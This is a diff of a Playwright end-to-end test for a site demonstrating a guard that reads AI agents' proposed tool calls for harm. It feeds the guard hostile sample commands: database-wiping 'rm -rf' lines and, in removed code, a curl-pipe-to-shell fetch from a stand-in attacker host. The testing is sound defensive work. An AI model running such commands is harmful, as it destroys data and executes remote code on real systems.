@@ -2,20 +2,34 @@
 /**
  * e2e_playwright_story.mjs — End-to-End Playwright Verification & Story Screenshots
  *
- * Verifies:
- * 1. Page 1 (index.html):
- *    - "RepE + Clef Live Residual Stream Telemetry" copy, blinking live badges,
- *      read-only trace explanation, 3 simple steps with chopped icons, and all 4 papers
- *      (arXiv:2310.01405, arXiv:2406.04313, arXiv:2406.00799, arXiv:2605.07990).
- *    - Interactive 4-Stage Brain Timeline (#timeline-demo): opt-in filter toggles
- *      (#tl-filters) and clickable malicious/benign prompt buttons (#tl-prompts).
- *    - Desktop & mobile lockups (lockup-dark.png, lockup-light.png, mark-dark.png, etc.).
- * 2. Page 2 (demo.html) — Unauthenticated Public Demo + 4-Step Password Gate Story:
- *    - Shot 1 (shots/story-1-password-prompt.png): Password prompt blocking the page (?lock=1).
- *    - Shot 2 (shots/story-2-typing-password.png): Typing the operator password into #auth-password-input.
- *    - Shot 3 (shots/story-3-dashboard-live.png): Unlocked live dashboard pumped with real :8090 telemetry.
- *    - Shot 4 (shots/story-4-perturbed-interactive.png): Sorting traces (#seg-sort), clicking prompts/traces,
- *      running a live Layer-16 probe (POST /v1/guard/tool-call), and perturbing controls.
+ * This verifies the site that is actually shipped, against the engine that
+ * is actually running.  Nothing here is a screenshot of a mock: the numbers
+ * on the page come from the guard, the code in the glass room comes from the
+ * model server, and the assertions are made on the JSON the browser got.
+ *
+ * 1. index.html — the story page
+ *    - the hero, the three beats, the paper, the two specimens, the proof
+ *    - every image loads
+ *    - the theme toggle switches the document theme
+ *    - the headline numbers are the ones the shipped dataset supports
+ * 2. demo.html — the glass room
+ *    - a real model streams a real patch into the pane
+ *    - the agent's proposed actions are each read BEFORE they would run,
+ *      and every row shows a live reading
+ *    - the visitor's own command is read live, and a harmful command is
+ *      read as MORE harmful than a benign one
+ *    - the OBSERVE/DETER switch changes what the page promises
+ * 3. the admission gate
+ *    - the page holds a device-bound session
+ *    - with CLEF_EXPECT_AUTH=required, the same call without that session
+ *      is REFUSED — the gate is real, not decorative
+ *
+ * Usage:
+ *    NODE_PATH=/path/to/playwright node clef-site/tools/e2e_playwright_story.mjs
+ *
+ * Environment:
+ *    BASE_URL         the site to test          (default http://127.0.0.1:8412)
+ *    CLEF_EXPECT_AUTH "required" | "open"      (default: not checked)
  */
 
 import { createRequire } from "node:module";
@@ -31,7 +45,7 @@ const SHOTS_DIR = path.resolve(__dirname, "..", "shots");
 fs.mkdirSync(SHOTS_DIR, { recursive: true });
 
 const BASE_URL = process.env.BASE_URL || "http://127.0.0.1:8412";
-const TOKEN = process.env.CLEF_TOKEN || "clef-live-2026";
+const EXPECT_AUTH = process.env.CLEF_EXPECT_AUTH || "";
 
 function assert(cond, msg) {
   if (!cond) {
@@ -46,191 +60,310 @@ async function main() {
   });
 
   try {
-    /* =========================================================================
-     * PART 1: 4-Step Password Gate -> Live Dashboard -> Perturbation Story
-     * ========================================================================= */
     const context = await browser.newContext({
       viewport: { width: 1440, height: 920 },
       deviceScaleFactor: 2,
     });
     const page = await context.newPage();
 
-    console.log("1. Navigating to locked console:", `${BASE_URL}/demo.html?lock=1`);
-    await page.goto(`${BASE_URL}/demo.html?lock=1`, { waitUntil: "networkidle" });
-    await page.waitForSelector("#auth-gate", { state: "visible" });
-
-    // Verify dashboard is hidden while locked
-    const mainVisibleWhileLocked = await page.evaluate(() => {
-      const m = document.getElementById("dashboard-main");
-      return m ? window.getComputedStyle(m).display !== "none" : false;
-    });
-    assert(!mainVisibleWhileLocked, "#dashboard-main must be hidden while body.is-locked is active");
-
-    const shot1 = path.join(SHOTS_DIR, "story-1-password-prompt.png");
-    await page.screenshot({ path: shot1, fullPage: false });
-    console.log("   Saved Shot 1 (Password prompt blocking page):", shot1);
-
-    // Step 2: Type password into #auth-password-input
-    console.log("2. Typing operator password into #auth-password-input...");
-    // Make password visible or type it and capture screenshot
-    await page.fill("#auth-password-input", TOKEN);
-    const typedVal = await page.inputValue("#auth-password-input");
-    assert(typedVal === TOKEN, "Password input must contain the typed token");
-
-    const shot2 = path.join(SHOTS_DIR, "story-2-typing-password.png");
-    await page.screenshot({ path: shot2, fullPage: false });
-    console.log("   Saved Shot 2 (Typing password):", shot2);
-
-    // Step 3: Submit password and verify live service data unlocks dashboard
-    console.log("3. Submitting password and unlocking live dashboard...");
-    const [infoRes] = await Promise.all([
-      page.waitForResponse((r) => r.url().includes("/api/info") && r.status() === 200),
-      page.click("#auth-submit-btn"),
-    ]);
-    const infoJson = await infoRes.json();
-    assert(
-      infoJson.architecture === "Qwen2ForCausalLM" && infoJson.d_model === 896,
-      `Expected live Qwen2ForCausalLM d_model=896 from /api/info, got ${JSON.stringify(infoJson)}`
-    );
-
-    await page.waitForSelector("#dashboard-main", { state: "visible" });
-    await page.waitForTimeout(500);
-
-    const shot3 = path.join(SHOTS_DIR, "story-3-dashboard-live.png");
-    await page.screenshot({ path: shot3, fullPage: false });
-    console.log("   Saved Shot 3 (Unlocked live dashboard with real service telemetry):", shot3);
-
-    // Step 4: Interact with components — sort data, click a prompt/trace, run a live probe, perturb threshold
-    console.log("4. Interacting with components (sorting data, clicking prompts, running live probe)...");
-    const sortDescBtn = page.locator('#seg-sort [data-sort="excess-desc"]');
-    if ((await sortDescBtn.count()) > 0) {
-      await sortDescBtn.click();
-      await page.waitForTimeout(200);
-      const excesses = await page.evaluate(() =>
-        Array.from(document.querySelectorAll("#rack .rack-row")).map((el) =>
-          Number(el.dataset.excess)
-        )
-      );
-      assert(excesses.length > 5, "Expected trace rows in #rack");
-      assert(
-        excesses[0] >= excesses[excesses.length - 1],
-        `Expected descending sort order: first=${excesses[0]} last=${excesses[excesses.length - 1]}`
-      );
-    }
-
-    // Verify Step 01 Opt-In Filter sync with #gate and #ex-advanced-drawer LayerSpine render
-    await page.click('#ex-chip-row .ex-specimen[data-rec-id="12"]');
-    await page.waitForTimeout(350);
-    await page.click('#optin-filters .ex-optin-card[data-optin-cluster="2"]');
-    const gateWordOptedOut = await page.locator("#gate .gate-word").textContent();
-    assert(
-      gateWordOptedOut === "OPTED OUT",
-      `Expected #gate .gate-word to be 'OPTED OUT' when Cluster 02 is unchecked, got '${gateWordOptedOut}'`
-    );
-    // Opt back in
-    await page.click('#optin-filters .ex-optin-card[data-optin-cluster="2"]');
-
-    // Run a live tool-call probe through POST /v1/guard/tool-call
-    await page.fill("#ex-input", "rm -rf /var/lib/postgresql/data");
-    const [probeRes] = await Promise.all([
-      page.waitForResponse((r) => r.url().includes("/v1/guard/tool-call") && r.status() === 200),
-      page.click("#ex-play-btn"),
-    ]);
-    const probeJson = await probeRes.json();
-    assert(
-      typeof probeJson.harm_cosine === "number" && typeof probeJson.harm_excess === "number",
-      `Expected real harm_cosine & harm_excess from /v1/guard/tool-call, got ${JSON.stringify(probeJson)}`
-    );
+    /* =====================================================================
+     * PART 1: index.html — the story
+     * ===================================================================== */
+    console.log("1. The story page:", `${BASE_URL}/index.html`);
+    await page.goto(`${BASE_URL}/index.html`, { waitUntil: "networkidle" });
     await page.waitForTimeout(400);
 
-    const shot4 = path.join(SHOTS_DIR, "story-4-perturbed-interactive.png");
-    await page.screenshot({ path: shot4, fullPage: false });
-    console.log("   Saved Shot 4 (Perturbed dashboard after sorting & live probe):", shot4);
-
-    /* =========================================================================
-     * PART 2: Page 1 (index.html) Story, Interactive Timeline, 4 Papers & Assets
-     * ========================================================================= */
-    console.log("5. Verifying Page 1 (index.html) story, interactive timeline, and 4 papers...");
-    await page.goto(`${BASE_URL}/index.html`, { waitUntil: "networkidle" });
-    await page.evaluate(() => {
-      document.documentElement.setAttribute("data-theme", "dark");
-      localStorage.setItem("clef-theme", "dark");
-    });
-    await page.reload({ waitUntil: "networkidle" });
-    await page.waitForTimeout(500);
-
-    const pageText = await page.locator("body").textContent();
+    const story = await page.locator("body").textContent();
+    assert(story.includes("PEEK INTO"), "the hero must say PEEK INTO");
     assert(
-      pageText.includes("RepE + Clef Live Residual Stream Telemetry"),
-      "Page 1 must include 'RepE + Clef Live Residual Stream Telemetry'"
+      story.includes("THE MODEL’S") || story.includes("THE MODEL'S"),
+      "the hero must name the model"
     );
-    for (const arxiv of ["2310.01405", "2406.04313", "2406.00799", "2605.07990"]) {
-      assert(pageText.includes(arxiv), `Page 1 must cite arXiv:${arxiv}`);
-    }
+    assert(
+      story.includes("representation engineering") ||
+        story.includes("Representation engineering"),
+      "the page must say what it does"
+    );
+    assert(story.includes("arXiv:2310.01405"), "the page must cite the paper");
 
-    // Verify all chopped logo & icon images loaded cleanly
-    const brokenImages = await page.evaluate(() =>
+    // The three beats: the problem, the idea, the proof.
+    const beats = await page.locator(".triple-col").count();
+    assert(beats === 3, `expected 3 beats, got ${beats}`);
+    const beatLabels = await page.locator(".triple-col .label").allTextContents();
+    assert(
+      beatLabels.join(" ").includes("THE PROBLEM") &&
+        beatLabels.join(" ").includes("THE IDEA") &&
+        beatLabels.join(" ").includes("THE PROOF"),
+      `the three beats must be problem/idea/proof, got ${JSON.stringify(beatLabels)}`
+    );
+
+    // The two specimens: one benign, one harmful.
+    const specimens = await page.locator(".versus article").count();
+    assert(specimens === 2, `expected 2 specimens, got ${specimens}`);
+    const specimenText = await page.locator(".versus").textContent();
+    assert(specimenText.includes("BENIGN"), "one specimen must be benign");
+    assert(specimenText.includes("HARMFUL"), "one specimen must be harmful");
+    assert(
+      specimenText.includes("git status --short"),
+      "the benign specimen must be a real command"
+    );
+    assert(
+      specimenText.includes("evil.example.com"),
+      "the harmful specimen must be a real command"
+    );
+
+    // The proof block carries the numbers, and the site must not claim a
+    // number the shipped dataset does not support.  The dataset is the
+    // source of truth; evals/site_claims.py checks the same thing from the
+    // other side.
+    const proof = await page.locator(".proof-claim").textContent();
+    assert(proof.includes("17/18"), `the proof must carry 17/18, got ${proof}`);
+    assert(proof.includes("0/18"), `the proof must carry 0/18, got ${proof}`);
+
+    // Every image loads.  A broken logo is a broken site.
+    const broken = await page.evaluate(() =>
       Array.from(document.querySelectorAll("img"))
         .filter((img) => !img.complete || img.naturalWidth === 0)
         .map((img) => img.src)
     );
-    assert(brokenImages.length === 0, `Broken images on Page 1: ${brokenImages.join(", ")}`);
+    assert(broken.length === 0, `Broken images on the story page: ${broken.join(", ")}`);
 
-    const shotHero = path.join(SHOTS_DIR, "story-5a-landing-hero-dark.png");
-    await page.screenshot({ path: shotHero, fullPage: false });
-    console.log("   Saved Shot 5a (Page 1 Hero & 3D Residual Stream):", shotHero);
+    // The theme toggle actually switches the theme.
+    await page.click('#seg-theme .seg-btn[data-theme="light"]');
+    await page.waitForTimeout(200);
+    assert(
+      (await page.getAttribute("html", "data-theme")) === "light",
+      "the light button must set data-theme=light"
+    );
+    await page.click('#seg-theme .seg-btn[data-theme="dark"]');
+    await page.waitForTimeout(200);
+    assert(
+      (await page.getAttribute("html", "data-theme")) === "dark",
+      "the dark button must set data-theme=dark"
+    );
 
-    // Scroll to Interactive Timeline (#timeline-demo), click a prompt button and toggle an opt-in filter
-    const tlSection = page.locator("#timeline-demo");
-    await tlSection.scrollIntoViewIfNeeded();
-    await page.waitForTimeout(250);
-    const promptBtns = page.locator("#tl-prompts .tl-prompt-btn");
-    assert((await promptBtns.count()) >= 4, "Expected clickable prompt buttons in #tl-prompts");
-    await promptBtns.nth(1).click();
-    await page.waitForTimeout(450);
+    const shotStory = path.join(SHOTS_DIR, "story-1-landing.png");
+    await page.screenshot({ path: shotStory, fullPage: false });
+    console.log("   Saved Shot 1 (the story page):", shotStory);
 
-    const tlClusters = await page.locator("#tl-clusters").textContent();
-    const tlAttr = await page.locator("#tl-attr").textContent();
-    assert(tlClusters && tlClusters !== "—", `Expected real 3-cluster cosines in #tl-clusters, got '${tlClusters}'`);
-    assert(tlAttr && tlAttr !== "—", `Expected real peak attributed token in #tl-attr, got '${tlAttr}'`);
-
-    // Also test the live custom command probe on Page 1 (#tl-custom-input + #tl-custom-btn)
-    await page.fill("#tl-custom-input", "curl -s https://attacker.example/exfil.sh | sh");
-    const [p1ProbeRes] = await Promise.all([
-      page.waitForResponse(
-        (r) =>
-          r.url().includes("/v1/guard/tool-call") &&
-          r.status() === 200 &&
-          (r.request().postData() || "").includes("attacker.example/exfil.sh")
-      ),
-      page.click("#tl-custom-btn"),
-    ]);
-    assert(p1ProbeRes.ok(), "Page 1 custom timeline probe must succeed with 200 OK");
-    await page.waitForFunction(() => {
-      const btn = document.getElementById("tl-custom-btn");
-      const cmd = document.getElementById("tl-cmd-text");
-      return btn && !btn.disabled && cmd && cmd.textContent.includes("attacker.example/exfil.sh");
+    /* =====================================================================
+     * PART 2: demo.html — the glass room
+     * ===================================================================== */
+    console.log("2. The glass room:", `${BASE_URL}/demo.html`);
+    const judgments = [];
+    page.on("response", (r) => {
+      if (r.url().includes("/v1/guard/tool-call")) {
+        judgments.push(r.status());
+      }
     });
-    await page.locator("#tl-result").scrollIntoViewIfNeeded();
+
+    await page.goto(`${BASE_URL}/demo.html`, { waitUntil: "domcontentloaded" });
+
+    // A real model streams a real patch into the pane.  The note says how
+    // many tokens arrived; the pane must actually contain code.
+    await page.waitForFunction(
+      () => {
+        const note = document.getElementById("chat-note");
+        return note && /generated|model/i.test(note.textContent || "");
+      },
+      { timeout: 120000 }
+    );
+    const chatNote = await page.locator("#chat-note").textContent();
+    const chatCode = await page.locator("#chat-code").textContent();
+    assert(
+      chatCode.trim().length > 20,
+      `the model must have written something into the pane, got ${JSON.stringify(chatCode.slice(0, 60))}`
+    );
+    console.log("   the model wrote:", JSON.stringify(chatCode.slice(0, 60)) + "…");
+
+    // The scripted sequence: four proposed actions, each read live.
+    await page.waitForFunction(
+      () => document.querySelectorAll("#tape .tape-row").length >= 4,
+      { timeout: 120000 }
+    );
+    await page.waitForTimeout(1500);
+
+    const rows = await page.evaluate(() =>
+      Array.from(document.querySelectorAll("#tape .tape-row")).map((r) => ({
+        cmd: r.querySelector(".t-cmd")?.textContent?.trim() || "",
+        mean: r.querySelector(".t-mean")?.textContent?.trim() || "",
+        out: r.querySelector(".t-out")?.textContent?.trim() || "",
+      }))
+    );
+    assert(rows.length >= 4, `expected 4 judged rows, got ${rows.length}`);
+    for (const row of rows) {
+      assert(row.cmd.length > 0, "every row must name the command");
+      assert(
+        /POINTS AT HARM|LOOKS BENIGN/.test(row.out),
+        `every row must show what the call means, got ${JSON.stringify(row.out)}`
+      );
+      assert(
+        /excess/.test(row.out),
+        `every row must show the live reading, got ${JSON.stringify(row.out)}`
+      );
+      assert(
+        /token \d+/.test(row.out),
+        `every row must show which token carried the signal, got ${JSON.stringify(row.out)}`
+      );
+    }
+    // The dangerous ones must be the ones that read as harmful.
+    const flagged = rows.filter((r) => /POINTS AT HARM/.test(r.out));
+    assert(
+      flagged.length >= 2,
+      `the harmful commands must be flagged, only ${flagged.length} of ${rows.length} were`
+    );
+    assert(
+      rows.some((r) => /rm -rf/.test(r.cmd)) && rows.some((r) => /curl/.test(r.cmd)),
+      "the sequence must contain a destructive and a network command"
+    );
+
+    // The DETER lens adds what the ENGINE did — and that has to be the
+    // guard's own decision, not the page's guess.
+    await page.click('#seg-mode .seg-btn[data-mode="deter"]');
+    await page.waitForTimeout(250);
+    const deterRows = await page.evaluate(() =>
+      Array.from(document.querySelectorAll("#tape .tape-row")).map(
+        (r) => r.querySelector(".t-out")?.textContent?.trim() || ""
+      )
+    );
+    for (const out of deterRows) {
+      assert(
+        /the engine (refused|allowed) it/.test(out),
+        `the deter lens must state what the engine did, got ${JSON.stringify(out)}`
+      );
+    }
+    await page.click('#seg-mode .seg-btn[data-mode="observe"]');
     await page.waitForTimeout(150);
 
-    const shot5 = path.join(SHOTS_DIR, "story-5-landing-timeline.png");
-    await page.screenshot({ path: shot5, fullPage: false });
-    console.log("   Saved Shot 5 (Page 1 Interactive Brain Timeline):", shot5);
+    const shotRoom = path.join(SHOTS_DIR, "story-2-glass-room.png");
+    await page.screenshot({ path: shotRoom, fullPage: false });
+    console.log("   Saved Shot 2 (the glass room, judged):", shotRoom);
 
-    // Check mobile lockup at 390x844
-    await page.setViewportSize({ width: 390, height: 844 });
-    await page.evaluate(() => window.scrollTo(0, 0));
-    await page.waitForTimeout(300);
-    const mobileMarkVisible = await page.evaluate(() => {
-      const m = document.getElementById("site-mark-mobile");
-      return m ? window.getComputedStyle(m).display !== "none" : false;
-    });
-    assert(mobileMarkVisible, "Mobile mark (#site-mark-mobile) must be visible at 390px width");
+    // The layer bars: 24 of them, one of them the probe.
+    const layers = await page.evaluate(() => ({
+      count: document.querySelectorAll("#layers .lay").length,
+      probe: document.querySelectorAll("#layers .lay.is-probe").length,
+    }));
+    assert(layers.count === 24, `expected 24 layer bars, got ${layers.count}`);
+    assert(layers.probe === 1, `expected 1 probe layer, got ${layers.probe}`);
 
-    const shot6 = path.join(SHOTS_DIR, "story-6-mobile-lockup.png");
-    await page.screenshot({ path: shot6, fullPage: false });
-    console.log("   Saved Shot 6 (Mobile lockup & hero):", shot6);
+    /* =====================================================================
+     * PART 3: the visitor's own command
+     * ===================================================================== */
+    console.log("3. The visitor's own command…");
+
+    // A harmful command.
+    await page.fill("#ex-input", "rm -rf /var/lib/mysql/production");
+    const [harmRes] = await Promise.all([
+      page.waitForResponse(
+        (r) => r.url().includes("/v1/guard/tool-call") && r.status() === 200
+      ),
+      page.click("#btn-read"),
+    ]);
+    const harm = await harmRes.json();
+    assert(
+      typeof harm.harm_excess === "number" && typeof harm.harm_cosine === "number",
+      `the harmful reading must carry real numbers, got ${JSON.stringify(harm).slice(0, 120)}`
+    );
+
+    // A benign one.
+    await page.fill("#ex-input", "cargo bench --no-run");
+    const [benignRes] = await Promise.all([
+      page.waitForResponse(
+        (r) => r.url().includes("/v1/guard/tool-call") && r.status() === 200
+      ),
+      page.click("#btn-read"),
+    ]);
+    const benign = await benignRes.json();
+
+    // The relative claim is the one that has to hold: the engine must read
+    // the destructive command as more harmful than the harmless one.  The
+    // absolute numbers move with the calibration; the ordering does not.
+    assert(
+      harm.harm_excess > benign.harm_excess,
+      `the destructive command must read as more harmful: ${harm.harm_excess} vs ${benign.harm_excess}`
+    );
+    assert(
+      harm.harm_cosine > benign.harm_cosine,
+      `the destructive command must have the higher harm cosine: ${harm.harm_cosine} vs ${benign.harm_cosine}`
+    );
+    console.log(
+      `   destructive: excess ${harm.harm_excess.toFixed(4)} cos ${harm.harm_cosine.toFixed(4)}` +
+        `   harmless: excess ${benign.harm_excess.toFixed(4)} cos ${benign.harm_cosine.toFixed(4)}`
+    );
+
+    const verdict = await page.locator("#yours-verdict").textContent();
+    assert(
+      /benign|harm/.test(verdict),
+      `the verdict must be one of the two readings, got ${JSON.stringify(verdict)}`
+    );
+
+    const shotYours = path.join(SHOTS_DIR, "story-3-your-turn.png");
+    await page.screenshot({ path: shotYours, fullPage: false });
+    console.log("   Saved Shot 3 (the visitor's own command):", shotYours);
+
+    /* =====================================================================
+     * PART 4: the mode switch
+     * ===================================================================== */
+    const observeSub = await page.locator("#mon-sub").textContent();
+    await page.click('#seg-mode .seg-btn[data-mode="deter"]');
+    await page.waitForTimeout(200);
+    const deterSub = await page.locator("#mon-sub").textContent();
+    assert(
+      observeSub !== deterSub && /deter/i.test(deterSub),
+      "the DETER switch must change what the page promises"
+    );
+
+    /* =====================================================================
+     * PART 5: the admission gate
+     * ===================================================================== */
+    const cookies = await context.cookies();
+    const session = cookies.find((c) => c.name === "zcode_sid");
+    const device = cookies.find((c) => c.name === "zcode_dev");
+    assert(session, "the page must hold a session cookie");
+    assert(device, "the page must hold a device cookie");
+
+    if (EXPECT_AUTH === "required") {
+      // The same call WITHOUT the session must be refused.  If it is not,
+      // the gate is decorative — and the whole public story is a lie.
+      const bare = await page.evaluate(async () => {
+        const r = await fetch("/v1/guard/tool-call", {
+          method: "POST",
+          credentials: "omit",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            prompt: "no session",
+            tool_name: "bash",
+            tool_args: { cmd: "ls" },
+          }),
+        });
+        return r.status;
+      });
+      assert(
+        bare === 401,
+        `a caller with no session must be refused, got ${bare}`
+      );
+      console.log("   a caller with no session was refused with", bare);
+    } else if (EXPECT_AUTH === "open") {
+      const bare = await page.evaluate(async () => {
+        const r = await fetch("/v1/guard/tool-call", {
+          method: "POST",
+          credentials: "omit",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            prompt: "no session",
+            tool_name: "bash",
+            tool_args: { cmd: "ls" },
+          }),
+        });
+        return r.status;
+      });
+      assert(
+        bare === 200,
+        `an open guard has no credential to demand, so it must answer, got ${bare}`
+      );
+      console.log("   the open guard answered an anonymous caller with", bare);
+    }
 
     await context.close();
     console.log("ALL PLAYWRIGHT E2E CHECKS PASSED!");
